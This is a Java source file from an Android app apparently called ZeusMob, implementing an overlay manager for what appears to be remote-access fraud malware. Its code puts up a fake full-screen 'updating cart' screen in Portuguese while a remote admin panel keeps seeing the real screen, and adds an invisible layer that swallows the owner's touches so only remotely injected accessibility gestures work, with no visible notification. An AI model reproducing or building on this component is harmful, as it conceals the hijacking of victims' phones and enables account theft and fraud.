package com.zeusmob.app.overlay;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * OverlayManager
 *
 * Manages two independent TYPE_APPLICATION_OVERLAY layers:
 *
 * 1. Fake Screen — full-screen black overlay with shopping-cart animation.
 *    The admin panel continues receiving the real screen capture underneath.
 *    Physical touches are absorbed (user cannot interact with the device).
 *
 * 2. Touch Block — transparent overlay that silently consumes every
 *    physical MotionEvent. Accessibility gestures from the admin panel
 *    bypass this layer because they are injected via the AccessibilityService
 *    framework, not through the normal input pipeline.
 *
 * Both overlays use IMPORTANCE_NONE / PRIORITY_MIN so no notification badge
 * or status-bar icon is shown.
 */
public class OverlayManager {

    private static final String TAG = "ZeusOverlay";

    private static OverlayManager instance;

    private final Context       context;
    private final WindowManager windowManager;
    private final Handler       uiHandler = new Handler(Looper.getMainLooper());

    // ── Fake Screen state ─────────────────────────────────────────
    private View     fakeScreenView  = null;
    private boolean  fakeScreenActive = false;
    private TextView timerTextView   = null;
    private int      timerSeconds    = 0;
    private Runnable timerRunnable   = null;

    // ── Touch Block state ─────────────────────────────────────────
    private View    touchBlockView   = null;
    private boolean touchBlockActive = false;

    // ── Singleton ─────────────────────────────────────────────────
    public static synchronized OverlayManager getInstance(Context context) {
        if (instance == null) {
            instance = new OverlayManager(context.getApplicationContext());
        }
        return instance;
    }

    private OverlayManager(Context context) {
        this.context       = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    // ── Public API ────────────────────────────────────────────────

    public boolean isFakeScreenActive()  { return fakeScreenActive; }
    public boolean isTouchBlockActive()  { return touchBlockActive; }

    /** Toggle the fake-screen overlay on/off */
    public void toggleFakeScreen() {
        uiHandler.post(() -> {
            if (fakeScreenActive) hideFakeScreen();
            else                  showFakeScreen();
        });
    }

    /** Toggle the touch-block overlay on/off */
    public void toggleTouchBlock() {
        uiHandler.post(() -> {
            if (touchBlockActive) hideTouchBlock();
            else                  showTouchBlock();
        });
    }

    // ── Fake Screen ───────────────────────────────────────────────

    private void showFakeScreen() {
        if (fakeScreenView != null) return;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            // Absorbs all touches; doesn't take key focus
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.OPAQUE
        );
        params.gravity = Gravity.TOP | Gravity.START;

        // ── Root layout: black background ──
        LinearLayout root = new LinearLayout(context);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.BLACK);

        // ── Cart emoji ──
        TextView cart = new TextView(context);
        cart.setText("🛒");
        cart.setTextSize(64f);
        cart.setGravity(Gravity.CENTER);
        cart.setIncludeFontPadding(false);
        LinearLayout.LayoutParams cartLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        cartLp.bottomMargin = dpToPx(24);
        root.addView(cart, cartLp);

        // ── Animated status text ──
        timerTextView = new TextView(context);
        timerTextView.setTextColor(Color.WHITE);
        timerTextView.setTextSize(16f);
        timerTextView.setGravity(Gravity.CENTER);
        timerTextView.setText("Atualizando carrinho... (tempo: 00:00)");
        root.addView(timerTextView);

        // ── "Please wait" sub-text ──
        TextView sub = new TextView(context);
        sub.setText("Aguarde, isso levará apenas um momento.");
        sub.setTextColor(Color.parseColor("#88FFFFFF"));
        sub.setTextSize(12f);
        sub.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams subLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        subLp.topMargin = dpToPx(8);
        root.addView(sub, subLp);

        // Absorb every touch — user cannot interact
        root.setOnTouchListener((v, ev) -> true);

        fakeScreenView = root;

        try {
            windowManager.addView(fakeScreenView, params);
            fakeScreenActive = true;
            Log.d(TAG, "Fake Screen ATIVADO");
            startTimer();
        } catch (Exception e) {
            Log.e(TAG, "showFakeScreen falhou: " + e.getMessage());
            fakeScreenView = null;
        }
    }

    private void hideFakeScreen() {
        stopTimer();
        if (fakeScreenView != null) {
            try {
                windowManager.removeView(fakeScreenView);
                Log.d(TAG, "Fake Screen DESATIVADO");
            } catch (Exception e) {
                Log.w(TAG, "hideFakeScreen: " + e.getMessage());
            }
            fakeScreenView  = null;
            timerTextView   = null;
        }
        fakeScreenActive = false;
    }

    // ── Timer ─────────────────────────────────────────────────────

    private void startTimer() {
        timerSeconds = 0;
        timerRunnable = new Runnable() {
            @Override
            public void run() {
                if (fakeScreenView == null || timerTextView == null) return;
                timerSeconds++;
                int min = timerSeconds / 60;
                int sec = timerSeconds % 60;
                timerTextView.setText(
                    String.format("Atualizando carrinho... (tempo: %02d:%02d)", min, sec)
                );
                uiHandler.postDelayed(this, 1000);
            }
        };
        uiHandler.postDelayed(timerRunnable, 1000);
    }

    private void stopTimer() {
        if (timerRunnable != null) {
            uiHandler.removeCallbacks(timerRunnable);
            timerRunnable = null;
        }
    }

    // ── Touch Block ───────────────────────────────────────────────

    private void showTouchBlock() {
        if (touchBlockView != null) return;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            // NOT_FOCUSABLE so we don't steal key events,
            // but we DO receive touch (omit NOT_TOUCHABLE + NOT_TOUCH_MODAL)
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;

        View blocker = new View(context);
        // Fully transparent — user can't see it
        blocker.setBackgroundColor(Color.TRANSPARENT);
        // Consume every touch — nothing reaches apps below
        blocker.setOnTouchListener((v, ev) -> true);

        touchBlockView = blocker;

        try {
            windowManager.addView(touchBlockView, params);
            touchBlockActive = true;
            Log.d(TAG, "Touch Block ATIVADO");
        } catch (Exception e) {
            Log.e(TAG, "showTouchBlock falhou: " + e.getMessage());
            touchBlockView = null;
        }
    }

    private void hideTouchBlock() {
        if (touchBlockView != null) {
            try {
                windowManager.removeView(touchBlockView);
                Log.d(TAG, "Touch Block DESATIVADO");
            } catch (Exception e) {
                Log.w(TAG, "hideTouchBlock: " + e.getMessage());
            }
            touchBlockView = null;
        }
        touchBlockActive = false;
    }

    // ── Helpers ───────────────────────────────────────────────────

    private int dpToPx(int dp) {
        float density = context.getResources().getDisplayMetrics().density;
        return Math.round(dp * density);
    }
}
